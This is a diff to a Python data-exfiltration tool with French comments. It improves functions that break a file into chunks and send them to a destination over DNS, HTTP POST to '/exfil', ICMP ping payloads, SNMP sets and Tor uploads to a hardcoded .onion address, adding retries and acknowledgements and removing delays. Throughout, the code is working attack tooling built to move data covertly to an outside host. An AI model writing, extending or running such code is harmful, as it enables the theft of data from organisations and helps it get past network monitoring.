@@ -116,8 +116,6 @@ def envoyer_paquets_dns(destination, parties, base_domain="exfil.domain.com"):
         except Exception as e:
             print(f"[!] Erreur DNS pour {domaine} : {e}")
 
-        time.sleep(0.5)
-
 # ========================
 # EXFILTRATION HTTP
 # ========================
@@ -128,14 +126,14 @@ def envoyer_paquets_http(destination, parties):
     path = "/exfil"
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
 
-    conn = http.client.HTTPConnection(ip, port, timeout=5)
+    conn = http.client.HTTPConnection(ip, port, timeout=300)
 
     for i, part in enumerate(tqdm(parties, desc="Envoi HTTP")):
-        time.sleep(1)
+        #time.sleep(1)
         payload = f"chunk={part}"
         conn.request("POST", path, payload, headers)
-        #res = conn.getresponse()
-        #res.read()
+        res = conn.getresponse()
+        res.read()
     conn.close()
 
 # ========================
@@ -288,19 +286,47 @@ async def envoyer_paquets_sftp(destination, parties):
 # EXFILTRATION ICMP
 # ========================
 
-def envoyer_paquets_icmp(destination, parties, delai: float = 0.02):
+import socket
+import time
+from tqdm import tqdm
+from pythonping import ping
+
+def envoyer_paquets_icmp(destination, parties, delai: float = 0.05, max_retries: int = 5):
     """
-    Envoie des données via ICMP (ping) vers une destination IP.
-    Chaque partie du fichier est envoyée dans un paquet ICMP.
+    Envoie les chunks via ICMP avec accusés de réception pour fiabilité.
+    Chaque paquet inclut un numéro de séquence.
     """
     total_parties = len(parties)
-    print(f"Envoi de {total_parties} paquets vers {destination}")
+    print(f"[*] Envoi de {total_parties} paquets ICMP vers {destination}")
 
-    for i, partie in enumerate(tqdm(parties, desc="Envoi des paquets", ncols=100)):
-        ping(destination, count=1, payload=partie.encode())
+    # Créer un socket RAW pour recevoir les ACKs du serveur
+    ack_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    ack_socket.settimeout(1)  # Timeout 1 seconde pour attendre les ACKs
+
+    for seq, partie in enumerate(tqdm(parties, desc="Envoi des paquets", ncols=100)):
+        header = f"{seq:06d}|".encode()
+        payload = header + partie.encode()
+
+        retries = 0
+        while retries < max_retries:
+            ping(destination, count=1, payload=payload)
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+                data, addr = s.recvfrom(1500)
+                if data == payload:
+                    # ACK reçu → on passe au chunk suivant
+                    break
+                else:
+                    print(f"[!] Mauvais ACK reçu, renvoi...")
+            except socket.timeout:
+                retries += 1
+                print(f"[!] Pas d'ACK pour paquet {seq}, tentative {retries}/{max_retries}")
+        if retries >= max_retries:
+            print(f"[X] Échec définitif pour le paquet {seq}")
+            continue
+        # Pause légère pour éviter de saturer le réseau
         time.sleep(delai)
-
-    print("\nTransmission terminée.")
+    print("[✓] Transmission terminée.")
 
 # ========================
 # EXFILTRATION SNMP
@@ -308,22 +334,21 @@ def envoyer_paquets_icmp(destination, parties, delai: float = 0.02):
 
 async def envoyer_paquets_snmp(destination, parties, delai: float = 0.002):
     engine = SnmpEngine()
-    with open("../exfiltration-main/pas_ouf/Wireshark-4.4.8-x64.exe", "rb") as f:
-        for idx, chunk in enumerate(tqdm(parties, desc="Envoi des paquets")):
-            err_ind, err_stat, _, _ = await set_cmd(
-                engine,
-                CommunityData("public", mpModel=1),
-                await UdpTransportTarget.create((destination, 16100), timeout=10, retries=1),
-                ContextData(),
-                ObjectType(
-                    ObjectIdentity("SNMPv2-MIB", "sysLocation", 0),
-                    OctetString(chunk)
-                )
+    for idx, chunk in enumerate(tqdm(parties, desc="Envoi des paquets")):
+        err_ind, err_stat, _, _ = await set_cmd(
+            engine,
+            CommunityData("public", mpModel=1),
+            await UdpTransportTarget.create((destination, 16100), timeout=10, retries=1),
+            ContextData(),
+            ObjectType(
+                ObjectIdentity("SNMPv2-MIB", "sysLocation", 0),
+                OctetString(chunk)
             )
-            if err_ind or err_stat:
-                print("Error:", err_ind or err_stat.prettyPrint())
-                return
-            await asyncio.sleep(delai)
+        )
+        if err_ind or err_stat:
+            print("Error:", err_ind or err_stat.prettyPrint())
+            return
+        await asyncio.sleep(delai)
     print("Done sending file in chunks.")
     engine.close_dispatcher()
 
@@ -334,7 +359,7 @@ async def envoyer_paquets_snmp(destination, parties, delai: float = 0.002):
 ONION_ADDR = "uiarfeveadqaj3frrwlqomhgoywfdlujhw65jnzsyku7oqdlz4rwwnyd.onion"
 TORRC_PATH = "/etc/tor/torrc"
 
-def envoyer_paquets_tor(destination, parties, delai: float = 2):
+async def envoyer_paquets_tor(destination, parties, delai: float = 2):
     system = platform.system()
     
     if system == "Linux":
@@ -343,13 +368,8 @@ def envoyer_paquets_tor(destination, parties, delai: float = 2):
         time.sleep(10)  # pour laisser le temps à Tor de se connecter
     
     elif system == "Windows":
-        tor_path = pathlib.Path("../tor/tor.exe")
-        if not tor_path.exists():
-            print("Tor executable not found at ../tor/tor.exe")
-            return
-        process = subprocess.Popen((str(tor_path), "-f", "../tor/torrc"))
-        print("Waiting for Tor to bootstrap...")
-        time.sleep(10)
+        print("You need to be running this on linux for this feature to work.")
+        return
     
     destination = "useless with tor but idc i'll keep it"
 
@@ -364,14 +384,14 @@ def envoyer_paquets_tor(destination, parties, delai: float = 2):
         with open(filename, "wb") as f:
             f.write(part)
 
-        try:
-            with open(filename, "rb") as f:
-                files = {"file": ("test.txt", f)}
-                url = f"http://{ONION_ADDR}/upload"
-                resp = requests.post(url, files=files, proxies=proxies, timeout=60)
-                print("Server response:", resp.json())
-        except requests.exceptions.RequestException as e:
-            print("Error:", e)
+        with open(filename, "rb") as f:
+            files = {"file": (filename, f)}
+            url = f"http://{ONION_ADDR}/upload"
+            resp = requests.post(url, files=files, proxies=proxies, timeout=300)
+            while resp.status_code != 200:
+                print("retrying...")
+                resp = requests.post(url, files=files, proxies=proxies, timeout=300)
+                print(f"Response: {resp.status_code} - {resp.text}")
         os.remove(filename)
     process.send_signal(signal.SIGINT)
     print("Tor stopped.")
@@ -382,7 +402,7 @@ def envoyer_paquets_tor(destination, parties, delai: float = 2):
 
 async def main():
     modes = ("http", "dns", "smtp", "ftp", "ssh", "icmp", "sftp", "ftps", "snmp", "tor")
-    tailles = (3000000000, 5, 17250000, 2000000000, 1500000, 1500, 2000000000, 2000000000, 185, 21000000)
+    tailles = (3000000000, 30, 17250000, 2000000000, 1500000, 1000, 2000000000, 2000000000, 185, 21000000)
 
     if len(sys.argv) < 4 or sys.argv[3] not in modes or len(sys.argv[2].split(".")) != 4:
         print(f"Utilisation : {sys.argv[0]} <Nom du fichier> <Adresse IP de destination> <Mode {modes}>")
@@ -422,7 +442,7 @@ async def main():
     elif mode == "snmp":
         await envoyer_paquets_snmp(destination, parties)
     elif mode == "tor":
-        envoyer_paquets_tor(destination, parties)
+        await envoyer_paquets_tor(destination, parties)
 
 if __name__ == "__main__":
     asyncio.run(main())
